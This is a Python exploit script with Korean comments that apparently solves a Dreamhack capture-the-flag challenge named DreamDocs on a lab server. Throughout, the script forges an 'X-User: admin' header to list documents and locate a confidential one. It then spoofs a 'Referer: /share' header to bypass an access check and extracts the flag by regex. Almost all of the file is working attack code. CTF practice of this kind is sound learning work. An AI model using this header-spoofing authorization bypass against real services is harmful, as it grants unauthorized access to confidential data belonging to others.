import requests
import json
import re
import sys

# 문제 서버 주소 (URL 끝에 / 안 붙게 주의)
BASE_URL = "http://host3.dreamhack.games:22629"

def main():
    print("[*] DreamDocs Exploit을 시작합니다...")
    print(f"[*] 타겟 URL: {BASE_URL}")
    print("-" * 60)
    
    # ==========================================
    # Step 1: /api/docs 에서 admin 권한으로 flag 문서 ID 추출
    # ==========================================
    api_url = f"{BASE_URL}/api/docs"
    headers_api = {
        "X-User": "admin"  # 관리자 권한으로 위장
    }
    
    print(f"[*] Step 1: {api_url} 에 접근하여 flag_doc_id를 찾습니다.")
    
    try:
        res_api = requests.get(api_url, headers=headers_api)
        docs = res_api.json()
        
        flag_doc_id = None
        for doc in docs:
            # 분류가 confidential인 문서를 찾습니다.
            if doc.get("classification") == "confidential":
                flag_doc_id = doc.get("id")
                print(f"[!] 🎯 Confidential 비밀 문서 발견! Document ID: {flag_doc_id}")
                break
        
        if not flag_doc_id:
            print("\n[-] Confidential 문서를 찾을 수 없습니다.")
            sys.exit(1)
            
    except Exception as e:
        print(f"\n[-] Step 1 실행 중 오류 발생: {e}")
        sys.exit(1)
        
    print("-" * 60)
    
    # ==========================================
    # Step 2: 알아낸 문서 ID로 접근하여 FLAG 텍스트 추출
    # ==========================================
    doc_url = f"{BASE_URL}/doc/{flag_doc_id}"
    headers_doc = {
        "X-User": "admin",      # 관리자 권한 우회
        "Referer": "/share"     # Referer 검증 우회
    }
    
    print(f"[*] Step 2: {doc_url} 에 접근하여 플래그를 추출합니다.")
    
    try:
        res_doc = requests.get(doc_url, headers=headers_doc)
        print(f"[+] 서버 응답 코드: {res_doc.status_code}")
        
        # 수정된 부분: HTML 이스케이프와 무관하게 DH{...} 형태만 콕 집어 추출합니다.
        match = re.search(r"(DH\{.*?\})", res_doc.text)
        
        if match:
            print("\n" + "=" * 60)
            print(f"[🎉] 플래그 획득 성공: {match.group(1)}")
            print("=" * 60)
        else:
            print("\n[-] 응답 본문에서 플래그를 찾을 수 없습니다. (전체 응답 확인 필요)")
            # 필요시 print(res_doc.text) 로 전체 HTML을 확인
            
    except Exception as e:
        print(f"\n[-] Step 2 실행 중 오류 발생: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()